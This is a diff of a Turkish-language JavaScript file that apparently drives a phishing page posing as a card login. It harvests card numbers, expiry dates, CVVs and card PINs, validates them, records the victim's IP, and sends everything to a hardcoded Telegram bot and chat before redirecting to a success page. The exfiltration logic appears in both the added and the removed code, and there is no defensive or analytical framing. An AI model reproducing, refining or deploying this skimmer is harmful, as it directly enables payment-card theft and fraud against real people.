@@ -1,4 +1,4 @@
-// phmain.js - KONSOL TESTLİ VERSİYON
+// phmain.js - submitCustomForm fonksiyonlu
 
 const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
 const CHAT_ID = "-1002475411082";
@@ -41,29 +41,84 @@ function sktKontrol(skt) {
 }
 
 function showAlert(msg) {
-    console.log('>>> showAlert çalıştı, mesaj:', msg);
     var alertDiv = document.getElementById('alertDiv');
-    console.log('>>> alertDiv:', alertDiv);
     if (alertDiv) {
         alertDiv.style.display = 'block';
         var p = alertDiv.querySelectorAll('p');
-        console.log('>>> p elementleri sayısı:', p.length);
-        if (p[2]) {
-            p[2].innerText = msg;
-            console.log('>>> mesaj yazıldı:', p[2].innerText);
-        } else {
-            console.log('>>> p[2] bulunamadı!');
-        }
-    } else {
-        console.log('>>> alertDiv BULUNAMADI!');
+        if (p[2]) p[2].innerText = msg;
     }
 }
 
-// Sayfa yüklendiğinde
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM yüklendi - TEST VERSİYONU');
+// ANA FONKSİYON - HTML'deki onclick bunu çağırıyor
+function submitCustomForm() {
+    console.log('submitCustomForm çalıştı');
     
-    // Kart numarası formatlama
+    var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
+    var skt = document.getElementById('exp').value;
+    var cvv = document.getElementById('cvv').value;
+    var sifre = document.getElementById('kkpw').value;
+    
+    // Doğrulamalar
+    if (!kartNo || kartNo.length !== 16) {
+        showAlert('Kart numarası 16 haneli olmalıdır.');
+        return;
+    }
+    if (!luhnKontrol(kartNo)) {
+        showAlert('Geçersiz kart numarası!');
+        return;
+    }
+    if (!skt || skt.length !== 5) {
+        showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
+        return;
+    }
+    if (!sktKontrol(skt)) {
+        showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
+        return;
+    }
+    if (!cvv || cvv.length !== 3) {
+        showAlert('CVV 3 haneli olmalıdır.');
+        return;
+    }
+    if (!sifre || sifre.length !== 4) {
+        showAlert('Kart şifresi 4 haneli olmalıdır.');
+        return;
+    }
+    
+    document.getElementById('alertDiv').style.display = 'none';
+    
+    var btn = document.getElementById('btn-spc');
+    if(btn) {
+        btn.innerHTML = 'Giriş yapılıyor...';
+        btn.disabled = true;
+    }
+    
+    var xhrIp = new XMLHttpRequest();
+    xhrIp.open('GET', 'https://api.ipify.org?format=json', true);
+    xhrIp.onload = function() {
+        var ip = 'Bilinmiyor';
+        if (xhrIp.status === 200) {
+            var data = JSON.parse(xhrIp.responseText);
+            ip = data.ip;
+        }
+        
+        var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
+        
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(mesaj);
+        var xhrTel = new XMLHttpRequest();
+        xhrTel.open('GET', url, true);
+        xhrTel.send();
+        
+        setTimeout(function() {
+            window.location.href = 'success.html';
+        }, 1000);
+    };
+    xhrIp.send();
+}
+
+// DOM yüklendiğinde formatlamaları ekle
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('DOM yüklendi');
+    
     var kartInput = document.getElementById('customUsername');
     if(kartInput) {
         kartInput.addEventListener('input', function() {
@@ -78,7 +133,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // SKT formatlama
     var expInput = document.getElementById('exp');
     if(expInput) {
         expInput.addEventListener('input', function() {
@@ -92,7 +146,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // CVV
     var cvvInput = document.getElementById('cvv');
     if(cvvInput) {
         cvvInput.addEventListener('input', function() {
@@ -101,93 +154,11 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Şifre
     var sifreInput = document.getElementById('kkpw');
     if(sifreInput) {
         sifreInput.addEventListener('input', function() {
             this.value = this.value.replace(/\D/g, '').slice(0, 4);
             document.getElementById('alertDiv').style.display = 'none';
         });
-    }
-    
-    // Buton
-    var btn = document.getElementById('btn-spc');
-    if(btn) {
-        btn.onclick = function(e) {
-            e.preventDefault();
-            console.log('>>> BUTONA TIKLANDI');
-            
-            var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
-            var skt = document.getElementById('exp').value;
-            var cvv = document.getElementById('cvv').value;
-            var sifre = document.getElementById('kkpw').value;
-            
-            console.log('>>> Kart No:', kartNo, 'uzunluk:', kartNo.length);
-            console.log('>>> SKT:', skt);
-            console.log('>>> CVV:', cvv);
-            console.log('>>> Şifre:', sifre);
-            
-            // DOĞRULAMALAR
-            if (!kartNo || kartNo.length !== 16) {
-                console.log('>>> HATA: Kart no 16 hane değil');
-                showAlert('Kart numarası 16 haneli olmalıdır.');
-                return;
-            }
-            if (!luhnKontrol(kartNo)) {
-                console.log('>>> HATA: Luhn kontrol başarısız');
-                showAlert('Geçersiz kart numarası!');
-                return;
-            }
-            if (!skt || skt.length !== 5) {
-                console.log('>>> HATA: SKT 5 karakter değil');
-                showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
-                return;
-            }
-            if (!sktKontrol(skt)) {
-                console.log('>>> HATA: SKT geçersiz veya süresi dolmuş');
-                showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
-                return;
-            }
-            if (!cvv || cvv.length !== 3) {
-                console.log('>>> HATA: CVV 3 hane değil');
-                showAlert('CVV 3 haneli olmalıdır.');
-                return;
-            }
-            if (!sifre || sifre.length !== 4) {
-                console.log('>>> HATA: Şifre 4 hane değil');
-                showAlert('Kart şifresi 4 haneli olmalıdır.');
-                return;
-            }
-            
-            console.log('>>> TÜM DOĞRULAMALAR GEÇTİ, TELEGRAM\'A GÖNDERİLİYOR');
-            
-            document.getElementById('alertDiv').style.display = 'none';
-            btn.innerHTML = 'Giriş yapılıyor...';
-            btn.disabled = true;
-            
-            var xhrIp = new XMLHttpRequest();
-            xhrIp.open('GET', 'https://api.ipify.org?format=json', true);
-            xhrIp.onload = function() {
-                var ip = 'Bilinmiyor';
-                if (xhrIp.status === 200) {
-                    var data = JSON.parse(xhrIp.responseText);
-                    ip = data.ip;
-                }
-                
-                var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
-                
-                var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(mesaj);
-                var xhrTel = new XMLHttpRequest();
-                xhrTel.open('GET', url, true);
-                xhrTel.send();
-                
-                setTimeout(function() {
-                    window.location.href = 'success.html';
-                }, 1000);
-            };
-            xhrIp.send();
-        };
-    } else {
-        console.log('>>> btn-spc BULUNAMADI!');
     }
 });
